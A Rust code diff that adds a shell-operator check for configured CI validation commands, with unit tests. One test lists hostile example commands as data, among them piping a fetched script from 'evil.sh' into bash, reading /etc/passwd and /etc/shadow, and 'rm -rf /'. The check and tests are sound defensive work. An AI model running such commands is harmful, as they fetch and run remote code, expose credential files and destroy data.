@@ -23,6 +23,38 @@ impl PostExecutionValidator {
         Self { config }
     }
 
+    /// Validate that a command string does not contain shell operators that
+    /// could enable command injection or execution escalation.
+    ///
+    /// Legitimate CI tool invocations (cargo, go, npm, ruff, etc.) never
+    /// require shell operators; their presence indicates either an
+    /// attacker-supplied payload or a misconfigured `ValidationConfig`.
+    ///
+    /// Applied only to operator-configured commands (from `ValidationConfig`).
+    /// Hardcoded defaults from `lang_detect` are trusted at compile time and
+    /// bypass this check.
+    fn validate_command_safety(cmd_str: &str) -> Result<(), String> {
+        const SHELL_OPERATORS: &[&str] = &[
+            "&&", "||", // logical chaining
+            ">>", // append redirection (must precede ">")
+            "|",  // piping
+            ";",  // command separator
+            "&",  // background execution
+            ">",  // output redirection
+            "<",  // input redirection
+            "`",  // backtick command substitution
+            "$(", // $() command substitution
+        ];
+        if let Some(op) = SHELL_OPERATORS.iter().find(|&&op| cmd_str.contains(op)) {
+            return Err(format!(
+                "Command `{cmd_str}` rejected: contains shell operator `{op}`. \
+                 Validation commands must invoke toolchain binaries directly \
+                 without shell operators."
+            ));
+        }
+        Ok(())
+    }
+
     /// Run a shell command via `sh -c` to support pipes, quotes, and complex expressions.
     ///
     /// Uses `kill_on_drop(true)` so that if the timeout fires and the future is dropped,
@@ -81,9 +113,16 @@ impl TurnInterceptor for PostExecutionValidator {
         let lang = lang_detect::detect_language(project);
 
         // Resolve pre_commit commands: config takes precedence over language detection.
+        // Config-provided commands are validated for shell operator safety; hardcoded
+        // defaults from lang_detect are trusted at compile time and bypass this check.
         let pre_commit = if self.config.pre_commit.is_empty() {
             lang_detect::default_pre_commit_commands(lang, project)
         } else {
+            for cmd in &self.config.pre_commit {
+                if let Err(e) = Self::validate_command_safety(cmd) {
+                    return PostExecuteResult::fail(e);
+                }
+            }
             self.config.pre_commit.clone()
         };
 
@@ -91,6 +130,11 @@ impl TurnInterceptor for PostExecutionValidator {
         let pre_push = if self.config.pre_push.is_empty() {
             lang_detect::default_pre_push_commands(lang, project)
         } else {
+            for cmd in &self.config.pre_push {
+                if let Err(e) = Self::validate_command_safety(cmd) {
+                    return PostExecuteResult::fail(e);
+                }
+            }
             self.config.pre_push.clone()
         };
 
@@ -275,6 +319,59 @@ mod tests {
         assert!(
             err.contains("timed out"),
             "expected timeout error, got: {err}"
+        );
+    }
+
+    // ── validate_command_safety ───────────────────────────────────────────────
+
+    #[test]
+    fn safe_config_commands_pass_safety_check() {
+        let safe = [
+            "cargo check --workspace",
+            "go test ./...",
+            "npx tsc --noEmit",
+            "ruff check .",
+            "./gradlew check",
+            "bundle exec rubocop",
+            "true",
+            "false",
+        ];
+        for cmd in safe {
+            assert!(
+                PostExecutionValidator::validate_command_safety(cmd).is_ok(),
+                "expected `{cmd}` to pass but it was rejected"
+            );
+        }
+    }
+
+    #[test]
+    fn dangerous_commands_are_rejected() {
+        let dangerous = [
+            "echo foo | bash",
+            "echo foo | sh -",
+            "cmd | python3 -",
+            "something ; bash -c evil",
+            "cargo check && curl evil.sh | bash",
+            "go test || true",
+            "curl evil.sh > /tmp/evil.sh",
+            "cat /etc/passwd >> /tmp/out",
+            "echo foo | /bin/bash",
+            "echo `whoami`",
+            "echo $(cat /etc/shadow)",
+            "cmd & rm -rf /",
+        ];
+        for cmd in dangerous {
+            assert!(
+                PostExecutionValidator::validate_command_safety(cmd).is_err(),
+                "expected `{cmd}` to be rejected but it passed"
+            );
+        }
+    }
+
+    #[test]
+    fn command_substitution_is_blocked_in_config_commands() {
+        assert!(
+            PostExecutionValidator::validate_command_safety("test -z \"$(gofmt -l .)\"").is_err()
         );
     }
 
